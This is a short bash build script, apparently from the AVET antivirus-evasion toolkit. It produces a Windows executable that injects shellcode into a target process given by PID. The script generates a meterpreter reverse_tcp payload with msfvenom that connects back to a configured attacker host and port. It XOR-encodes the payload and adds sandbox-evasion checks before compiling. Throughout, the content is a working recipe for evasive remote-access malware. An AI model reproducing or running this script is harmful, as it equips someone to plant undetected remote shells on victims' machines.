#!/bin/bash
# Shellcode injection 32-bit example build script
# Creates an executable that injects the payload into a target process
# The target is specified on execution via the third(!) command line argument, by PID


# Usage example of generated output.exe:
#
# output.exe first second 480
#
# The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
#
# Use the third parameter to specify the PID of the process you want to inject your payload into.


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# import feature construction interface
. build/feature_construction.sh

# generate metasploit payload that will later be injected into the target process
# use reverse_tcp because the 32-bit test system appears to not handle https well
msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/sc_raw.txt

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'
reset_evasion_technique_counter

# generate key file
generate_key preset aabbcc12de input/key_raw.txt

# encode msfvenom shellcode
encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# no command preexec
set_command_source no_data
set_command_exec no_command

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source from_command_line_raw

# set decoder
set_decoder xor

# set shellcode binding technique
set_payload_execution_method inject_shellcode

# enable debug print
enable_debug_print

# compile 
$win32_compiler -o output/output.exe source/avet.c -lws2_32
strip output/output.exe

# cleanup
cleanup_techniques
